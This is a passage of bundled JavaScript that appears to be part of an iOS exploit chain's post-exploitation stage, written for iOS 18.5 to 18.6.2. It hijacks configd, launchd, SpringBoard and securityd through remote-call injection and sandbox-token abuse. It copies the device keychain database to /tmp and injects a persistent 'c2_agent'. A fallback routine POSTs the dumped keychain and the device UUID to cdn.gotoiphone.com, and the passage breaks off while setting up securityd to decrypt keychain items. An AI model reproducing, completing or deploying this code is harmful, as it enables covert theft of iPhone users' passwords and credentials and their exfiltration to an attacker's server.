	// keepAlive until /tmp DB is usable - destroy() tears RC and kills mid-copy.
	p7_flog("PEMK-B s1_launchd ok"); p7_flushLog();
	try { __peClaimRunToken(); } catch (_ct) { try { p7_flog("PEMK-B pe_run_token claim throw: " + _ct); p7_flushLog(); } catch (_e) {} }
}

	function __peStage2() {
	// Clear stale copier notify so we do not race a previous run.
	try {
		var __Nclr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
		__Nclr.callSymbol("unlink", "/tmp/keychain_copier_status.txt");
		__Nclr.callSymbol("unlink", "/tmp/keychain_mpd_go");
		__Nclr.callSymbol("unlink", "/tmp/keychain-2.db");
	} catch (_u) {}

	__labKcCopier = null;
	var __rcCopyOk = false;
	var __rcCopySz = -1;

	// Detect iOS version: 18.6.1+ must NOT enter RemoteCall rc_copy (hangs).
	// 18.6.0 keeps the lab rc_copy primary path unchanged.
	var __iosV = __labIosForGate();
	try { globalThis.__labIosVer = __iosV; } catch (_cv) {}
	// 18.6.1 / 18.6.2: match iOS18nui InjectJS path (no PEMK-C0 rc_copy).
	var __useNuiKc = (__iosV.maj === 18 && __iosV.min === 6 && __iosV.pat >= 1);
	p7_flog("PEMK-C0 ios=" + (__iosV.raw || "?") + " useNuiKc=" + (__useNuiKc ? "1" : "0")); p7_flushLog();

	if (__useNuiKc) {
		// ===== iOS18nui path (18.6.1 / 18.6.2) =====
		// inject() evaluates keychain_copier in a BACKGROUND thread and returns immediately.
		// Full applyTokensForRemoteTask() into the same configd while that script runs hangs
		// on 18.6.2 (seen: stuck at "inject OK -> applyTokens", never destroy / s3+).
		// Fix: open configd RC, apply ONLY keychain/tmp tokens, inject via existing task,
		// then destroy WITHOUT full PathDictionary apply. Copier finishes during the 3s settle.
		LOG("[PE-WORKER] inject keychain_copier -> configd (nui 18.6.1+)");
		p7_flog("PEMK-C0 nui InjectJS begin"); p7_flushLog();
		try { pe_alive_ping("pe_s2_nui_begin"); } catch (_pi0) {}
		try {
			var __kcRC = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("configd", migFilterBypass);
			if (!__kcRC.success()) {
				LOG("[PE-WORKER] keychain_copier: configd RC failed");
				p7_flog("PEMK-C0 nui configd RC failed"); p7_flushLog();
				try { pe_alive_ping("pe_s2_nui_fail"); } catch (_pi2a) {}
			} else {
				p7_flog("PEMK-C0 nui configd RC ok -> pre-token"); p7_flushLog();
				var __kcPaths = [
					"/private/var/Keychains/",
					"/private/var/Keychains/keychain-2.db",
					"/private/var/Keychains/keychain-2.db-wal",
					"/private/var/Keychains/keychain-2.db-shm",
					"/tmp/",
					"/tmp/keychain-2.db",
					"/private/var/tmp/"
				];
				var __kcTokOk = 0;
				for (var __kpi = 0; __kpi < __kcPaths.length; __kpi++) {
					try {
						if (__labApplyFreshToken(__kcRC, __kcPaths[__kpi])) __kcTokOk++;
					} catch (_kt) {}
				}
				p7_flog("PEMK-C0 nui pre-token ok=" + __kcTokOk + "/" + __kcPaths.length); p7_flushLog();
				var kcCopier = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](__kcRC, _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_20__["default"], migFilterBypass);
				p7_flog("PEMK-C0 nui InjectJS ctor ok"); p7_flushLog();
				var __injT0 = Date.now();
				if (kcCopier.inject()) {
					LOG("[PE-WORKER] keychain_copier OK");
					// Do NOT applyTokensForRemoteTask here — deadlocks with bg evaluateScript on 18.6.2.
					p7_flog("PEMK-C0 nui inject OK ms=" + (Date.now() - __injT0) + " skip full applyTokens -> destroy"); p7_flushLog();
					kcCopier.destroy();
					p7_flog("PEMK-C0 nui destroy ok"); p7_flushLog();
					try { pe_alive_ping("pe_s2_nui_ok"); } catch (_pi1) {}
				} else {
					LOG("[PE-WORKER] keychain_copier FAILED");
					p7_flog("PEMK-C0 nui inject FAILED ms=" + (Date.now() - __injT0)); p7_flushLog();
					try { __kcRC.destroy(); } catch (_rd) {}
					try { pe_alive_ping("pe_s2_nui_fail"); } catch (_pi2) {}
				}
			}
		} catch (kcErr) {
			LOG("[PE-WORKER] keychain_copier error: " + kcErr);
			p7_flog("PEMK-C0 nui exception: " + kcErr); p7_flushLog();
			try { pe_alive_ping("pe_s2_nui_exc"); } catch (_pi3) {}
		}
		// Background copier needs a short settle before Phase2 /tmp open.
		LOG("[PE-WORKER] waiting 3s for keychain copy (nui)...");
		for (var __nuiWi = 1; __nuiWi <= 3; __nuiWi++) {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
		}
		p7_flog("PEMK-C s2_keychain done nui=1 rcCopy=0"); p7_flushLog();
		try { pe_alive_ping("pe_s2_done"); } catch (_ps2) {}
		return;
	}

	// ===== PRIMARY (18.6.0 / non-18.6.1+): RemoteCall copy inside configd =====
	// Issue fresh Keychains tokens → consume into configd → open/read/write → /tmp.
	// Avoids InjectJS evaluateScript race that often copies before tokens land.
	LOG("[PE-WORKER] RemoteCall keychain copy via configd...");
	p7_flog("PEMK-C0 rc_copy start"); p7_flushLog();
	try {
		p7_flog("PEMK-C0 before RemoteCall(configd)"); p7_flushLog();
		var cfgRc = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("configd", migFilterBypass);
		p7_flog("PEMK-C0 after RemoteCall success=" + !!(cfgRc && cfgRc.success())); p7_flushLog();
		if (cfgRc && cfgRc.success()) {
			var __tokPaths = [
				"/private/var/Keychains/",
				"/private/var/Keychains/keychain-2.db",
				"/private/var/Keychains/keychain-2.db-wal",
				"/private/var/Keychains/keychain-2.db-shm",
				"/var/Keychains/",
				"/var/Keychains/keychain-2.db",
				"/tmp/",
				"/private/var/tmp/"
			];
			var __tokN = 0;
			for (var __ti = 0; __ti < __tokPaths.length; __ti++) {
				if (__labApplyFreshToken(cfgRc, __tokPaths[__ti])) __tokN++;
			}
			try {
				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(cfgRc);
			} catch (_at) {}
			p7_flog("PEMK-C0 tokens fresh=" + __tokN); p7_flushLog();

			var __pairs = [
				["/private/var/Keychains/keychain-2.db", "/tmp/keychain-2.db"],
				["/private/var/Keychains/keychain-2.db-wal", "/tmp/keychain-2.db-wal"],
				["/private/var/Keychains/keychain-2.db-shm", "/tmp/keychain-2.db-shm"]
			];
			for (var __fi = 0; __fi < __pairs.length; __fi++) {
				var __cr = __labRcCopyFile(cfgRc, __pairs[__fi][0], __pairs[__fi][1]);
				p7_flog("PEMK-C0 copy " + __pairs[__fi][1].split("/").pop() +
					" ok=" + __cr.ok + " sz=" + __cr.sz + " err=" + (__cr.err || ""));
				p7_flushLog();
				if (__fi === 0 && __cr.ok && __cr.sz > 1048576) {
					__rcCopyOk = true;
					__rcCopySz = __cr.sz;
				}
			}
			if (!__rcCopyOk) {
				var __cr2 = __labRcCopyFile(cfgRc, "/var/Keychains/keychain-2.db", "/tmp/keychain-2.db");
				p7_flog("PEMK-C0 copy alt ok=" + __cr2.ok + " sz=" + __cr2.sz + " err=" + (__cr2.err || ""));
				p7_flushLog();
				if (__cr2.ok && __cr2.sz > 1048576) {
					__rcCopyOk = true;
					__rcCopySz = __cr2.sz;
				}
			}
			if (__rcCopyOk) {
				__labWriteCopierReady(cfgRc, "/tmp/keychain-2.db", __rcCopySz);
				try {
					globalThis.__labKcCopyPath = "/tmp/keychain-2.db";
					globalThis.__labKcReady = true;
				} catch (_g) {}
				p7_flog("PEMK-C0 READY via rc_copy sz=" + __rcCopySz); p7_flushLog();
				LOG("[PE-WORKER] rc_copy READY sz=" + __rcCopySz);
			}
			// Breadcrumbs: last pe_mpd was READY then silence → pin destroy vs InjectJS.
			p7_flog("PEMK-C0 before cfgRc.destroy"); p7_flushLog();
			try { pe_alive_ping("pe_s2_pre_destroy"); } catch (_pd0) {}
			try {
				cfgRc.destroy();
				p7_flog("PEMK-C0 after cfgRc.destroy ok"); p7_flushLog();
				try { pe_alive_ping("pe_s2_post_destroy"); } catch (_pd1) {}
			} catch (_d) {
				p7_flog("PEMK-C0 cfgRc.destroy threw: " + _d); p7_flushLog();
				try { pe_alive_ping("pe_s2_destroy_err"); } catch (_pd2) {}
			}
		} else {
			p7_flog("PEMK-C0 configd RemoteCall FAILED"); p7_flushLog();
			LOG("[PE-WORKER] configd RemoteCall FAILED");
		}
	} catch (__rcErr) {
		p7_flog("PEMK-C0 rc_copy exception: " + __rcErr); p7_flushLog();
		LOG("[PE-WORKER] rc_copy error: " + __rcErr);
	}

	// ===== SECONDARY: InjectJS keychain_copier (fallback only) =====
	// (3) rc_copy READY already put db/wal/shm in /tmp — do NOT re-run copier (108MB race).
	// (2) fallback: deferStart → applyTokens → startScript (tokens before evaluateScript).
	if (__rcCopyOk) {
		p7_flog("PEMK-C0 skip InjectJS: rc_copy READY sz=" + __rcCopySz); p7_flushLog();
		try { pe_alive_ping("pe_s2_skip_inject_rc_ok"); } catch (_pi0) {}
		LOG("[PE-WORKER] skip keychain_copier InjectJS (rc_copy READY)");
	} else {
		p7_flog("PEMK-C0 before InjectJS ctor (rc_copy miss)"); p7_flushLog();
		try { pe_alive_ping("pe_s2_pre_inject"); } catch (_pi0) {}
		LOG("[PE-WORKER] inject keychain_copier -> configd (deferStart then tokens)");
		try {
			let kcCopier = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"]("configd", _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_20__["default"], migFilterBypass);
			p7_flog("PEMK-C0 InjectJS ctor ok, calling inject(deferStart)"); p7_flushLog();
			try { pe_alive_ping("pe_s2_inject_call"); } catch (_pi1) {}
			if (kcCopier.inject(0, { deferStart: true })) {
				p7_flog("PEMK-C0 inject(defer) returned true"); p7_flushLog();
				try { pe_alive_ping("pe_s2_inject_ok"); } catch (_pi2) {}
				LOG("[PE-WORKER] keychain_copier prepared (deferred)");
				p7_flog("PEMK-C0 before applyTokens"); p7_flushLog();
				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(kcCopier.task);
				try {
					__labApplyFreshToken(kcCopier.task, "/private/var/Keychains/");
					__labApplyFreshToken(kcCopier.task, "/private/var/Keychains/keychain-2.db");
					__labApplyFreshToken(kcCopier.task, "/tmp/");
				} catch (_ft) {
					p7_flog("PEMK-C0 freshToken warn: " + _ft); p7_flushLog();
				}
				p7_flog("PEMK-C0 after applyTokens"); p7_flushLog();
				try { pe_alive_ping("pe_s2_post_tokens"); } catch (_pi3) {}
				p7_flog("PEMK-C0 before startScript"); p7_flushLog();
				kcCopier.startScript();
				p7_flog("PEMK-C0 after startScript"); p7_flushLog();
				try { pe_alive_ping("pe_s2_start_script"); } catch (_pi3b) {}
				LOG("[PE-WORKER] keychain_copier OK (tokens then evaluate)");
				__labKcCopier = kcCopier;
			} else {
				p7_flog("PEMK-C0 inject() returned false"); p7_flushLog();
				try { pe_alive_ping("pe_s2_inject_fail"); } catch (_pi4) {}
				LOG("[PE-WORKER] keychain_copier FAILED");
			}
		} catch (kcErr) {
			p7_flog("PEMK-C0 InjectJS/inject exception: " + kcErr); p7_flushLog();
			try { pe_alive_ping("pe_s2_inject_exc"); } catch (_pi5) {}
			LOG("[PE-WORKER] keychain_copier error: " + kcErr);
		}
	}
	p7_flog("PEMK-C s2_keychain done rcCopy=" + __rcCopyOk + " sz=" + __rcCopySz); p7_flushLog();
	try { pe_alive_ping("pe_s2_done"); } catch (_ps2) {}
}

	function __peStage3() {
	// Brief settle then inject c2 BEFORE long DB wait so devices that die mid-copy still beacon.
	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 2);
	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
	LOG("[PE] destroying launchd RC to free zone resources...");
	try { launchdTask.destroy(); } catch(e) { LOG("[PE] launchd destroy warn: " + e); }

	// ===== Inject loader + c2_agent BEFORE P7 Phase 2 (and before long kc wait) =====
	p7_flog("PEMK-D s3_mempress launchd destroyed"); p7_flushLog();
}

	function __peStage4() {
	// Fine-grained diag: pin hang to InjectJS ctor / inject() / applyTokens / destroy.
	LOG("[PE-WORKER] inject loader -> " + targetProcess);
	p7_flog("PEMK-E0 s4 begin target=" + targetProcess); p7_flushLog();
	var __s4Ok = false;
	try {
		p7_flog("PEMK-E0 before InjectJS ctor"); p7_flushLog();
		var __tCtor = Date.now();
		let agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
		p7_flog("PEMK-E0 InjectJS ctor ok ms=" + (Date.now() - __tCtor)); p7_flushLog();
		let agentPid = 0;
		p7_flog("PEMK-E0 before inject()"); p7_flushLog();
		var __tInj = Date.now();
		var __injOk = false;
		try {
			__injOk = !!agentLoader.inject();
		} catch (_injE) {
			p7_flog("PEMK-E0 inject() threw: " + _injE); p7_flushLog();
			throw _injE;
		}
		p7_flog("PEMK-E0 inject() returned ok=" + (__injOk ? "1" : "0") + " ms=" + (Date.now() - __tInj)); p7_flushLog();
		if (__injOk) {
			try { agentPid = agentLoader.task.pid(); } catch (_pidE) {
				p7_flog("PEMK-E0 pid() threw: " + _pidE); p7_flushLog();
			}
			LOG("[PE-WORKER] loader OK pid=" + agentPid);
			p7_flog("PEMK-E0 loader OK pid=" + agentPid + " -> applyTokens"); p7_flushLog();
			var __tTok = Date.now();
			try {
				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
				p7_flog("PEMK-E0 applyTokens ok ms=" + (Date.now() - __tTok)); p7_flushLog();
			} catch (_tokE) {
				p7_flog("PEMK-E0 applyTokens threw ms=" + (Date.now() - __tTok) + " err=" + _tokE); p7_flushLog();
				throw _tokE;
			}
			p7_flog("PEMK-E0 before destroy"); p7_flushLog();
			try { agentLoader.destroy(); } catch (_dE) {
				p7_flog("PEMK-E0 destroy warn: " + _dE); p7_flushLog();
			}
			p7_flog("PEMK-E0 destroy ok"); p7_flushLog();
			__s4Ok = true;
		} else {
			LOG("[PE-WORKER] loader inject FAILED");
			p7_flog("PEMK-E0 loader inject FAILED"); p7_flushLog();
		}
	} catch (_s4E) {
		LOG("[PE-WORKER] s4_loader error: " + _s4E);
		p7_flog("PEMK-E0 exception: " + _s4E); p7_flushLog();
	}
	p7_flog("PEMK-E s4_loader done ok=" + (__s4Ok ? "1" : "0")); p7_flushLog();
}

	function __pePostWarDumpFallback(reason) {
		// When SpringBoard RC/inject fails after Phase2, still ship dump via MPD HTTP.
		try {
			var N = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
			var dumpPath = "/tmp/keychain_c2_dump.json";
			if (Number(N.callSymbol("access", dumpPath, 0)) !== 0) {
				p7_flog("PEMK-F0 war-fallback skip: no dump (" + reason + ")"); p7_flushLog();
				return false;
			}
			var fd = Number(N.callSymbol("open", dumpPath, 0));
			if (fd < 0) { p7_flog("PEMK-F0 war-fallback open fail"); p7_flushLog(); return false; }
			var sz = Number(N.callSymbol("lseek", fd, 0, 2));
			N.callSymbol("lseek", fd, 0, 0);
			if (!(sz > 32) || sz > 5 * 1024 * 1024) {
				N.callSymbol("close", fd);
				p7_flog("PEMK-F0 war-fallback bad sz=" + sz); p7_flushLog();
				return false;
			}
			var buf = N.callSymbol("malloc", BigInt(sz + 1));
			var nr = Number(N.callSymbol("read", fd, buf, sz));
			N.callSymbol("close", fd);
			if (nr !== sz) {
				try { N.callSymbol("free", buf); } catch (_f) {}
				p7_flog("PEMK-F0 war-fallback read nr=" + nr + " sz=" + sz); p7_flushLog();
				return false;
			}
			var dumpStr = N.readString(buf, sz);
			try { N.callSymbol("free", buf); } catch (_f2) {}
			var kcObj = null;
			try { kcObj = JSON.parse(dumpStr); } catch (_pj) { kcObj = null; }
			if (!kcObj) {
				p7_flog("PEMK-F0 war-fallback json parse fail"); p7_flushLog();
				return false;
			}
			var uuid = "";
			try { uuid = String(globalThis.__LAB_DEVICE_UUID__ || ""); } catch (_u) {}
			var pkg = {
				device_uuid: uuid,
				uuid: uuid,
				lhu: uuid,
				source: "pe_war_fallback",
				reason: String(reason || ""),
				keychain: kcObj,
				sandbox: {}
			};
			var body = JSON.stringify(pkg);
			var ok = !!__labCfHttp("POST", "/war", body, false, { host: "cdn.gotoiphone.com", port: 443 });
			p7_flog("PEMK-F0 war-fallback " + (ok ? "POST ok" : "POST fail") + " bytes=" + body.length + " reason=" + reason);
			p7_flushLog();
			return ok;
		} catch (e) {
			p7_flog("PEMK-F0 war-fallback err: " + e); p7_flushLog();
			return false;
		}
	}

	function __peStage5() {
	// Deadlock: inject() starts evaluateScript in background, then full
	// applyTokensForRemoteTask() into SpringBoard hangs (~2min+) and c2 never
	// POSTs /war. NUI path: pre-token /tmp dumps, inject via existing RC, skip
	// full PathDictionary apply. Use for 18.5 and 18.6.1+; 18.6.0 keeps legacy.
	// 18.5 after long Phase2: SpringBoard RC often fails 0x494 (120s EXC wait) —
	// stage order runs s5 before s6 on 18.5; still keep PE /war fallback here.
	LOG("[PE-WORKER] inject c2_agent -> " + targetProcess);
	var __iosC2 = __labIosForGate();
	// 18.5: same SpringBoard applyTokens deadlock as 18.6.1+ (hung after PEMK-F0).
	var __useNuiC2 = (__iosC2.maj === 18 && (
		(__iosC2.min === 5) ||
		(__iosC2.min === 6 && __iosC2.pat >= 1) ||
		(__iosC2.min > 6)
	));
	// If version still unknown, prefer NUI (legacy deadlock is worse than skip-applyTokens).
	if (!__useNuiC2 && !(__iosC2.maj)) __useNuiC2 = true;
	p7_flog("PEMK-F0 ios=" + (__iosC2.raw || "?") + " useNuiC2=" + (__useNuiC2 ? "1" : "0")); p7_flushLog();
	var __c2Injected = false;
	try {
		let c2Code = _raw_loader_c2_agent_js__WEBPACK_IMPORTED_MODULE_17__["default"];
		try {
			let diagData = globalThis.__ucredDiag || "no_diag";
			let diagSnippet = '\nglobalThis.__ucredDiag=' + JSON.stringify(diagData) + ';\nglobalThis.__peInjectTs=' + JSON.stringify(String(Date.now())) + ';\n';
			c2Code = c2Code.replace('Native.init();', 'Native.init();' + diagSnippet);
			LOG("[PE-WORKER] ucred diag inserted (" + diagData.length + " chars)");
		} catch(dErr) {
			LOG("[PE-WORKER] diag insert error: " + dErr);
		}
		if (__useNuiC2) {
			p7_flog("PEMK-F0 nui SpringBoard RC begin"); p7_flushLog();
			var __c2RC = null;
			for (var __c2Try = 0; __c2Try < 2; __c2Try++) {
				try { globalThis.__peRemoteFail = 0; } catch (_zf) {}
				var __tRc = Date.now();
				try {
					__c2RC = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"](targetProcess, migFilterBypass);
				} catch (_rcE) {
					p7_flog("PEMK-F0 SpringBoard RC threw try=" + (__c2Try + 1) + " " + _rcE); p7_flushLog();
					__c2RC = null;
				}
				var __fail = 0;
				try { __fail = globalThis.__peRemoteFail || 0; } catch (_ff) {}
				if (__c2RC && __c2RC.success()) {
					p7_flog("PEMK-F0 SpringBoard RC ok try=" + (__c2Try + 1) + " ms=" + (Date.now() - __tRc)); p7_flushLog();
					break;
				}
				p7_flog("PEMK-F0 SpringBoard RC fail try=" + (__c2Try + 1) + "/2 fail=0x" + Number(__fail).toString(16) + " ms=" + (Date.now() - __tRc));
				p7_flushLog();
				if (__c2RC) { try { __c2RC.destroy(); } catch (_rd0) {} }
				__c2RC = null;
				// 0x494 = first EXC wait timeout (120s) — retrying usually wastes another 120s.
				if (Number(__fail) === 0x494) break;
				try { libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 2000000); } catch (_us) {}
			}
			if (!__c2RC || !__c2RC.success()) {
				LOG("[PE-WORKER] c2_agent: SpringBoard RC failed");
				p7_flog("PEMK-F0 SpringBoard RC failed -> war-fallback"); p7_flushLog();
				__pePostWarDumpFallback("sb_rc_fail");
			} else {
				p7_flog("PEMK-F0 SpringBoard RC ok -> pre-token"); p7_flushLog();
				var __c2Paths = [
					"/tmp/",
					"/tmp/keychain_c2_dump.json",
					"/tmp/keychain_c2_dump.json.tmp",
					"/tmp/keychain_c2_dump.done",
					"/tmp/keychain_c2_dump.partial",
					"/tmp/p7_debug.log",
					"/private/var/tmp/"
				];
				var __c2TokOk = 0;
				for (var __cpi = 0; __cpi < __c2Paths.length; __cpi++) {
					try {
						if (__labApplyFreshToken(__c2RC, __c2Paths[__cpi])) __c2TokOk++;
					} catch (_ct) {}
				}
				p7_flog("PEMK-F0 pre-token ok=" + __c2TokOk + "/" + __c2Paths.length); p7_flushLog();
				var c2Agent = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](__c2RC, c2Code, migFilterBypass);
				p7_flog("PEMK-F0 InjectJS ctor ok"); p7_flushLog();
				if (c2Agent.inject()) {
					LOG("[PE-WORKER] c2_agent OK - persistent loop started");
					// Do NOT applyTokensForRemoteTask — deadlocks with bg evaluateScript.
					p7_flog("PEMK-F0 c2 inject OK skip full applyTokens -> destroy"); p7_flushLog();
					c2Agent.destroy();
					__c2Injected = true;
					try { globalThis.__peC2Injected = true; } catch (_g) {}
					p7_flog("PEMK-F0 destroy ok"); p7_flushLog();
				} else {
					LOG("[PE-WORKER] c2_agent FAILED");
					p7_flog("PEMK-F0 c2 inject FAILED -> war-fallback"); p7_flushLog();
					try { __c2RC.destroy(); } catch (_rd) {}
					__pePostWarDumpFallback("inject_fail");
				}
			}
		} else {
			p7_flog("PEMK-F0 legacy SpringBoard inject begin"); p7_flushLog();
			let c2Agent = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, c2Code, migFilterBypass);
			p7_flog("PEMK-F0 legacy InjectJS ctor ok"); p7_flushLog();
			if (c2Agent.inject()) {
				LOG("[PE-WORKER] c2_agent OK - persistent loop started");
				p7_flog("PEMK-F0 legacy inject ok -> applyTokens"); p7_flushLog();
				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(c2Agent.task);
				c2Agent.destroy();
				__c2Injected = true;
				try { globalThis.__peC2Injected = true; } catch (_g2) {}
				p7_flog("PEMK-F0 legacy c2 OK"); p7_flushLog();
			} else {
				LOG("[PE-WORKER] c2_agent FAILED");
				p7_flog("PEMK-F0 legacy c2 FAILED -> war-fallback"); p7_flushLog();
				__pePostWarDumpFallback("legacy_inject_fail");
			}
		}
	} catch (c2Err) {
		LOG("[PE-WORKER] c2_agent error: " + c2Err);
		p7_flog("PEMK-F0 exception: " + c2Err); p7_flushLog();
		if (!__c2Injected) __pePostWarDumpFallback("exception");
	}
	p7_flog("PEMK-F s5_c2 done injected=" + (__c2Injected ? "1" : "0")); p7_flushLog();
}

	function __peStage6() {
	// Wait like bak success: /tmp/keychain-2.db size > 1MB, OR READY notify from copier/rc_copy.
	// Then Phase2: MPD sqlite3_open(path) → iterate ciphertext → securityd AKS unwrap.
	if (typeof __peStillOwner === "function" && !__peStillOwner()) {
		p7_flog("PEMK-G skip s6: lost pe_run_token (newer/other PE)");
		p7_flushLog();
		return;
	}
	p7_flog("[PE-WORKER] waiting for keychain db (size>1MB or READY, max 90s)...");
	p7_flushLog();
	var __labKcReady = false;
	var __labKcPath = "/tmp/keychain-2.db";
	var __labKcPaths = ["/tmp/keychain-2.db", "/private/var/tmp/keychain-2.db"];
	for (var __labWi = 0; __labWi < 90; __labWi++) {
		if (typeof __peStillOwner === "function" && !__peStillOwner()) {
			p7_flog("PEMK-G abort wait: lost pe_run_token");
			p7_flushLog();
			return;
		}
		var __st = __labKcReadStatus();
		if (__st && __st.ready) {
			__labKcReady = true;
			__labKcPath = __st.path || __labKcPath;
			try { globalThis.__labKcCopyPath = __labKcPath; globalThis.__labKcReady = true; } catch (_g) {}
			p7_flog("[PE-WORKER] keychain COPY READY notify path=" + __labKcPath + " t=" + (__labWi + 1) + "s raw=" + String(__st.raw).slice(0, 120));
			p7_flushLog();
			break;
		}
		for (var __labPi = 0; __labPi < __labKcPaths.length; __labPi++) {
			var __labSz = __labKcDbSize(__labKcPaths[__labPi]);
			if (__labSz > 1048576) {
				__labKcReady = true;
				__labKcPath = __labKcPaths[__labPi];
				try { globalThis.__labKcCopyPath = __labKcPath; globalThis.__labKcReady = true; } catch (_g2) {}
				p7_flog("[PE-WORKER] keychain db ready path=" + __labKcPath + " sz=" + __labSz + " t=" + (__labWi + 1) + "s");
				p7_flushLog();
				break;
			}
		}
		if (__labKcReady) break;
		if ((__labWi % 10) === 9) {
			p7_flog("[PE-WORKER] still waiting keychain db t=" + (__labWi + 1) + "s");
			p7_flushLog();
		}
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
	}
	if (!__labKcReady) {
		p7_flog("[PE-WORKER] keychain db not ready after 90s - SKIP Phase2 (no AKS/sqlite until copy)");
		p7_flushLog();
	}
	if (__labKcCopier) {
		try { __labKcCopier.destroy(); } catch (_kd) {}
		__labKcCopier = null;
	}


	// ===== P7 Phase 2: V4 Local SQLite + Remote AKS Oracle Pipeline =====
	// Hard gate: MPD must see READY (copy done) before sqlite open + securityd AKS unwrap.
	if (p7_enableP7 && !__labKcReady) {
		p7_flog("[PE-WORKER] Phase2 aborted: no keychain READY — will not connect securityd AKS");
		p7_flushLog();
	} else if (p7_enableP7) {
		let p7_secRC = null;
		try {
			p7_flog("=== Phase 2: V4 AKS Oracle Pipeline (READY path=" + __labKcPath + ") ===");
		let N = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];

			function p7_toPtr(v) {
				if (typeof v === 'bigint') return v;
				if (typeof v === 'number') return BigInt(v);
				if (v === null || v === undefined) return 0n;
				p7_flog("WARN toPtr: type=" + typeof v + " v=" + String(v).slice(0, 40));
				return 0n;
			}
			function p7_toRC(v) {
				if (typeof v === 'number') return v;
				if (typeof v === 'bigint') return Number(v & 0xFFFFFFFFn);
				if (v === null || v === undefined) return -1;
				p7_flog("WARN toRC: type=" + typeof v + " v=" + String(v).slice(0, 40));
				return -1;
			}

			function p7_requirePtr(label, v) {
				if (typeof v === 'bigint') return v;
				if (typeof v === 'number') return BigInt(v);
				p7_flog("BUG requirePtr(" + label + "): got " + typeof v);
				throw new TypeError("requirePtr(" + label + "): expected bigint|number, got " + typeof v);
			}

			// --- Poke securityd: 3x SecItemCopyMatching (wake threads before RC) ---
			p7_flog("Poke: waking securityd...");
			try {
				var p7_rpResult = p7_toPtr(N.callSymbol("malloc", 8n));
				if (p7_rpResult && p7_rpResult !== 0n) {
					var p7_rpKSC = N.readPtr(p7_toPtr(N.callSymbol("dlsym", 0xfffffffffffffffen, "kSecClass")));
					var p7_rpKGP = N.readPtr(p7_toPtr(N.callSymbol("dlsym", 0xfffffffffffffffen, "kSecClassGenericPassword")));
					var p7_rpKML = N.readPtr(p7_toPtr(N.callSymbol("dlsym", 0xfffffffffffffffen, "kSecMatchLimit")));
					var p7_rpKM1 = N.readPtr(p7_toPtr(N.callSymbol("dlsym", 0xfffffffffffffffen, "kSecMatchLimitOne")));
					for (var pi = 0; pi < 3; pi++) {
						var pq = p7_toPtr(N.callSymbol("CFDictionaryCreateMutable", 0n, 2n, 0n, 0n));
						if (!pq || pq === 0n) break;
						N.callSymbol("CFDictionarySetValue", pq, p7_rpKSC, p7_rpKGP);
						N.callSymbol("CFDictionarySetValue", pq, p7_rpKML, p7_rpKM1);
						N.write64(p7_rpResult, 0n);
						var pr = Number(N.callSymbol("SecItemCopyMatching", pq, p7_rpResult));
						var pref = N.readPtr(p7_rpResult);
						if (pref && pref !== 0n) N.callSymbol("CFRelease", pref);
						N.callSymbol("CFRelease", pq);
						p7_flog("poke[" + pi + "] ret=" + pr);
					}
					N.callSymbol("free", p7_rpResult);
				}
				p7_flog("Poke done");
			} catch (pokeErr) {
				p7_flog("Poke error: " + pokeErr);
			}

			// --- RC(securityd) single attempt (immediately after poke) ---
			p7_flushLog();
			if (typeof __peStillOwner === "function" && !__peStillOwner()) {
				p7_flog("PEMK-G abort Phase2: lost pe_run_token before securityd RC");
				p7_flushLog();
				throw "pe_run_token_lost";
			}
			var p7_t0 = Date.now();
			p7_flog("RC: creating securityd (before c2 to avoid SecItem contention)...");
			p7_secRC = null;
			for (var p7_rcTry = 0; p7_rcTry < 3; p7_rcTry++) {
				if (typeof __peStillOwner === "function" && !__peStillOwner()) {
					p7_flog("PEMK-G abort Phase2: lost pe_run_token during securityd RC retry");
					p7_flushLog();
					throw "pe_run_token_lost";
				}
				var p7_tTry = Date.now();
				p7_flog("RC: creating securityd try=" + (p7_rcTry + 1) + "/3");
				try {
					p7_secRC = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("securityd", migFilterBypass);
					p7_flog("RC: constructor took " + (Date.now() - p7_tTry) + "ms success=" + (p7_secRC && p7_secRC.success()));
				} catch (rcErr) {
					p7_flog("RC constructor threw after " + (Date.now() - p7_tTry) + "ms: " + String(rcErr));
					p7_secRC = null;
				}
				if (p7_secRC && p7_secRC.success()) break;
				if (p7_secRC) { try { p7_secRC.destroy(); } catch(e) {} }
				p7_secRC = null;
				try { libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 2000000); } catch (_us) {}
			}
			p7_flog("RC: securityd total " + (Date.now() - p7_t0) + "ms");
			if (!p7_secRC || !p7_secRC.success()) {
				p7_flog("RC(securityd) FAILED");
				if (p7_secRC) { try { p7_secRC.destroy(); } catch(e) {} }
				p7_secRC = null;
		} else {
				let p7_remotePid = p7_toRC(p7_secRC.call(3000, "getpid"));
